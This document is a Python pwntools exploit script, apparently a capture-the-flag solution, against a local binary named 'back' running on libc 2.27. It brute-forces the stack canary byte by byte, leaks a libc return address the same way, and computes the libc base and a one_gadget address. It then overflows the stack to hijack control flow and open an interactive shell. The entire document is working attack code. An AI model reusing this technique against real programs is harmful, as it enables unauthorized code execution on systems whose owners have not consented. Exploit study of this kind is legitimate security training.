from pwn import *
io=process("./back",env={"LD_PRELOAD":"./libc-2.27.so"})
io.sendline("2")
io.sendline("9")
io.sendline("aaaaaaaaa")
string="a"*9
length=10
canary=""
for r in range(7):
    for i in range(256):
        if(i!=9 and i!=10 and i!=11 and i!=12 and i!=13 and i!=32):
            io.sendline("1")
            io.sendline(str(length))
            pay=string+p8(i)
            io.sendline(pay)
            lea=io.recvline()
            if(lea[:-1]=="You found a secret!"):
                print i
                canary=canary+p8(i)
                string=string+p8(i)
                length=length+1
                break
print len(string)
canary=u64("\x00"+canary)
io.sendline("2")
io.sendline("56")
io.sendline("1"*56)
string="1"*56
length=57
address=""
for r in range(6):
    for i in range(256):
        if(i!=9 and i!=10 and i!=11 and i!=12 and i!=13 and i!=32):
            io.sendline("1")
            io.sendline(str(length))
            pay=string+p8(i)
            io.sendline(pay)
            lea=io.recvline()
            if(lea[:-1]=="You found a secret!"):
                print i
                address=address+p8(i)
                string=string+p8(i)
                length=length+1
                break
print len(address)
address=u64(address+"\x00\x00")
io.sendline("2")
io.sendline("32")
base=address-0x21b97
print hex(base)
one=base+0x4f2c5
pay="a"*8+p64(canary)+"b"*8+p64(one)#+p64(canary)
io.sendline(pay)
gdb.attach(io)
io.interactive()